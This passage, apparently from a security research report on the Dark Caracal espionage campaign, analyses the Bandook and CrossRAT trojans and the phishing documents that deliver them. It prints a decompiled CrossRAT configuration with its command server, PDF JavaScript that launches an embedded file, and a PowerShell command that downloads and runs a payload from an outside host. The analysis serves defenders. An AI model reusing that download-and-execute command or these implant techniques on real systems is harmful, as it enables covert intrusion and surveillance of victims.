@@ -1,0 +1,209 @@
+Surveillanceware - Desktop Components
+The desktop malware component exists in a range of file types, including executables, zip archives, PDFs, and Microsoft’s
+composite document file format. No zero days or publicly known exploits were located in these files and, based on several of
+the documents, the primary attack vector is believed to be social engineering via spear-phishing. Analysis into Dark Caracal’s
+desktop tooling did result in the discovery of a new cross-platform Java RAT known as CrossRAT and confirmed that this actor
+is using new variants of the Bandook family.
+Bandook
+The Bandook RAT was originally identified during EFF’s Operation Manul research, however, this investigation surfaced new
+variants belonging to this family. Written in Delphi and targeting Windows operating systems, Bandook samples are packed at
+multiple stages in order to both evade detection and slow down the process of reverse engineering by security analysts. At the
+time of writing, 19 out of 63 antivirus engines on the malware repository VirusTotal flagged most Bandook samples as malicious.
+First stage samples of the version of Bandook used by Dark Caracal include what appears to be a drawing program and a
+trojanized version of the Psiphon circumvention software [20] . While the drawing application was not fully functional and did not
+provide a user interface when launched, the modified version of Psiphon contained the complete legitimate functionality of the
+original application.
+The first stage malware is signed with a valid SSL certificate issued by Certum CA for Ale Couperus (alecouperus@mail[.]com).
+We have identified several distinct samples signed with this certificate. This suggests that the actors behind these samples
+control the private key for this certificate and have the ability to sign arbitrary packages. It is unclear at this time whether the
+private key associated with this certificate has been stolen or if the attackers obtained it via legitimate sources.
+Upon initial execution, the first stage of Bandook decrypts several strings that are stored in the data section and base64
+encoded. Below is the plaintext of some of these strings, which we can see as Windows API calls.
+20 SHA256 hash: ed25b0c20b1c1b271a511a1266fe3967ab851aaa9f793bdf4f3d19de1dcf6532
+31
+SECURITY RESEARCH REPORT
+Figure 25: Decoded strings from the Bandook sample
+The malware uses these API calls to decrypt Bandook’s second stage, an embedded resource. This resource is a randomly
+named eight-character string of uppercase letters and numbers. During our research, we only observed the numbers two and
+three being used and these were often positioned towards the end of the string. Following the decryption of the second stage,
+the iexplore.exe binary is started and immediately replaced with the loaded resource. This is a technique known as “process
+hollowing [21] ”.
+The second stage Bandook samples are occasionally packed with the following modified UPX packer “UPX Modified >> *$igBy
+Ahmed18”. Not all second stages were packed indicating that the authors may be actively developing the malware. As expected,
+the core malicious functionality resides in the second stage, which attempts to implant itself in the system and contact command
+and control infrastructure for further instructions. At this point, the malware has the ability to start new processes, manipulate the
+file system and registry, take screen captures, escalate privileges, create mutexes, get system information, execute commands,
+get window names, and beacon to infrastructure.
+21 https://attack.mitre.org/wiki/Technique/T1093
+32
+SECURITY RESEARCH REPORT
+Bandook communication with attacker infrastructure takes place over a TCP port with HTTP payloads Base64 encoded and
+suffixed with the string “&&&”. The following is an example of a decoded communication from an infected system:
+@0000~!18128~!192.168.1.82~!610930~!EFFuser~!Seven~!0d 0h
+3m~!0~!4.1~!21/04/2017~!0~!0~!0~!0~!~!0~!0--~!None~!0~!
+Instructions sent from Dark Caracal infrastructure to Bandook compromised systems make use of “~!” as a delimiter, the
+same approach used by the Pallas Android malware. This suggests there is a possibility Bandook and Pallas were written by
+the same author or that the author of one was inspired by the authors of the other. We found Bandook supports the following
+set of commands.
+|CaptureScreen|DeleteFileFromDevice|DeleteAutoFTPFromDB|
+|---|---|---|
+|Init|CopyMTP|ExecuteTV|
+|ClearCred|ChromeInject|ExecuteAMMY|
+|GetCamlist|DisableChrome|DDOSON|
+|SendCam|RarFolder|ExecuteTVNew|
+|StopCam|SendUSBList|getkey|
+|Uninstall|SignoutSkype|SendMTPList|
+|CompressArchive|StealUSB|SendMTPList2|
+|GenerateReports|StartFileMonitor|GrabFileFromDevice|
+|GetWif|SendFileMonLog|PutFileOnDevice|
+|StartShell|GetUSBMONLIST|StopFileMonitor|
+|GetSound|GetFileMONLIST|SendinfoList|
+|SplitMyFile|StopUSBMonitor|EnableAndLoadCapList|
+|GetAutoFTP|SearchMain|DisableMouseCapture|
+|SendStartup|StopSearch|AddAutoFTPToDB|
+From this, we can infer some additional functionality, including the ability to view the victim’s webcam, record sound, get Wi-Fi
+connections, manipulate USB devices, manipulate the Chrome browser, sign the victim out of Skype, search for files, upload new
+files to the device, execute secondary infections, or participate in a DDOS attack.
+Systems infected with this Bandook variant contain a copy of the first stage in the path C:\Users\user\AppData\
+Roaming\%appname%\%appname%.exe. Similarly, in such cases, autostart registry keys are written with the same name as the
+dropped file to HKEY_USERS\Software\Microsoft\Windows\CurrentVersion\Run.
+33
+SECURITY RESEARCH REPORT
+CrossRAT
+While investigating the axroot[.]com domain, we discovered a new remote access trojan called CrossRAT that we believe was
+developed by, or for, Dark Caracal. Written in Java with the ability to target Windows, Linux, and OSX, CrossRAT is able to
+manipulate the file system, take screenshots, run arbitrary DLLs for secondary infection on Windows, and gain persistence on
+the infected system.
+When executed in a Windows environment, CrossRAT attempts to copy itself to %AppData%\Local\ Temp\mediamgrs.jar before,
+like Bandook, creating an auto-start registry key in HKEY_USERS\Software\Microsoft\Windows\CurrentVersion\Run with the
+name “mediamgrs”.
+On OSX and Linux, it attempts to write a copy of itself to /usr/var/mediamgrs.jar. If CrossRAT does not have sufficient permissions
+to write to this directory, it will fail back to the following path under the user’s home directory: $HOME/Library/mediamgrs.jar.
+For CrossRAT installations on OSX, a Launch Agent is created under $HOME/Library/ LaunchAgents/mediamgrs.plist to ensure
+that it will be launched again when the computer restarts. When on Linux, this persistence is achieved by writing an autorun file
+to $HOME/.config/autostart/mediamgrs.desktop.
+CrossRAT performs communications to its C2 infrastructure via a TCP socket. The following is an example of content sent over
+the wire from a compromised machine:
+5287249f-caa2-4b66-850c-49eedd46cf47$#@@0000$#@192.168.1.16$#@Windows
+7$#@6.1$#@EFFuser^585948$#@0.1$#@GROUP2$#@&&&
+CrossRAT uses a similar structure to Pallas and Bandook when communicating with infrastructure. Specifically, it uses &&& to
+terminate the response string and uses @### to start command strings.
+Below is a code snippet from a CrossRAT sample. The response prefixes, hard coded C2 server of flexberry[.]com, and fixed
+port of 2223, are clearly visible.
+public final class k
+{
+public static boolean a = false;
+// Hardcoded C2 Information
+public static String b = “flexberry.com”; // C2 Server
+public static int c = 2223; // C2 Port
+34
+SECURITY RESEARCH REPORT
+(continued from page 34)
+public static String d = “$#@”; // Argument delimiter
+public static String e = “^!@”; // delimiter within arguments
+public static UUID f;
+public static String g;
+public static Preferences h;
+public static String i = “0.1”; // Version Number
+public static String j = “GROUP2”; // Campaign name
+public static Socket k;
+public static Socket l;
+// Server command prefixes
+public static String m = “@0000”; // Enumerate root directories on the system. 0 args
+public static String n = “@0001”; // Enumerate files on the system. 1 arg
+public static String o = “@0002”; // Create blank file on system. 1 arg
+public static String p = “@0003”; // Copy File. 2 args
+public static String q = “@0004”; // Move file. 2 args
+public static String r = “@0005”; // Write file contents. 4 args
+public static String s = “@0006”; // Read file contents. 4 args
+public static String t = “@0007”; // Heartbeat request. 0 args
+public static String u = “@0008”; // Get screenshot. 0 args
+public static String v = “@0009”; // Run a DLL (windows only). 1 arg
+// Client response prefixes
+public static String w = “@0000”; // client hello
+public static String x = “@0001”; // heartbeat response
+public static String y = “@0002”; // List of system root directories
+public static String z = “@0003”; // Status message for file manager connect, unimplemented
+public static String A = “@0004”; // Status message for file manager connect, unimplemented
+public static String B = “@0005”; // List of files on system
+public static String C = “@0006”; // End list of files on system
+public static String D = “@0007”; // file created status message
+public static String E = “@0008”; // file written status message
+public static String F = “@0009”; // file moved status message
+public static String G = “@0010”; // file write status
+public static String H = “@0011”; // file read status and file contents
+public static String I = “@0012”; // send screenshot contents
+public static String J = “@0013”; // Run DLL status message
+public static String K; // Filepath for CrossRAT
+Analysis of CrossRAT shows that it has a version number of 0.1, which indicates that its malicious capabilities are still under
+development. Implemented functionality includes the ability to enumerate attacker-specified directories, copy / move / read
+files, beacon to C2 infrastructure, run attacker specific libraries (Windows only), and create empty files. The CrossRAT sample
+we discovered was last modified in March of 2017.
+35
+SECURITY RESEARCH REPORT
+Infected Documents
+We identified several Word documents which appear to be intended for use as infection vectors in phishing attacks.
+None of the documents appear to contain any exploits, but rather rely on macros to run malicious code on a target
+system. If executed in an environment that has macros enabled, the malware downloads its second stage components.
+We saw this same process in numerous malicious PDF files that used javascript to download secondary stages. The
+following script is an example of this functionality, which is identical to the malicious Word doc with the SHA256 hash
+e5eeb0a46dac58b171ebcefec60e9ff351fc7279d95892c6f48f799a1a364215 (Word macro fixed.doc).
+var v = app.viewerVers, ion;
+if (v < 7) {
+var n = 0;
+if (this.dataObjects != null) n = this.dataObjects.length;
+if (v >= 5 && v < 6 && n > 0 && (app.viewerVariation == “Full” || app.viewerVariation ==
+“Fill-In”)) {
+if (this.external) app.alert(“This document has file attachments. To view the
+attachments, click the Save button to save a copy of the document, open the copy in Acrobat,
+and use the File > Document Properties > Embedded Data Objects menu.”, 3, 0);
+else app.\alert(“This document has file attachments. Use the File > Document Properties
+
+Embedded Data Objects menu to view the attachments.”, 3, 0);
+
+} else if (v >= 6 && v < 7) {
+if (n == 0) {
+var np = this.numPages;
+syncAnnotScan();\
+for (var p = 0; p < np && n == 0; ++p) {
+var annots = this.getAnnots(p);
+if (annots != null) {
+for (var i = 0; i < annots.length; ++i) {
+if (annots[i].type == “FileAttachment”) {
+n = 1;\
+break;
+}
+}
+}
+}
+}
+if (n > 0) {
+if (this.external) app.alert(“This document has file attachments. To view the
+attachments, click the black triangle at the top of the document window’s vertical scrollbar
+and \
+choose File Attachments.”, 3, 0);
+else app.alert(“This document has file attachments. Use the Document > File
+Attachments menu to view the attachments.”, 3, 0);
+}
+}
+}
+--
+this.exportDataObject({ cName: “BL920123.doc”, nLaunch: 2 });
+36
+SECURITY RESEARCH REPORT
+Figure 26: An observed malicious Word file that, when executed, attempts to run macros in order to download
+and execute Bandook stage one
+Other Samples
+Surprisingly, we also observed a malicious Microsoft Compiled HTML Help file with the .chm extension. Primarily used for
+software documentation, .chm files were first introduced with the release of Window 98. However, they are still supported in
+Windows 7. The chm file attempts to execute a command via Powershell that downloads an additional file called ne.abc from
+the server cma-cgrm[.]com. Below is the command contained in the malicious .chm file.
+cmd.exe,/c powershell.exe -ExecutionPolicy bypass -noprofile
+-WindowStyle Hidden (New-Object
+System.Net.WebClient).DownloadFile(‘https://cma
+cgrm[.]com/ebusiness/ne.abc’,’%TEMP%\chmplg.exe’);Start-Process
+%TEMP%\chmplg.exe;
+At the time of analysis, this server was no longer live and, as such, the associated ne.abc binary has not yet been acquired and
+does not appear on VirusTotal. The cma-cgrm[.]com domain is not obviously connected with other infrastructure.
+37
+SECURITY RESEARCH REPORT
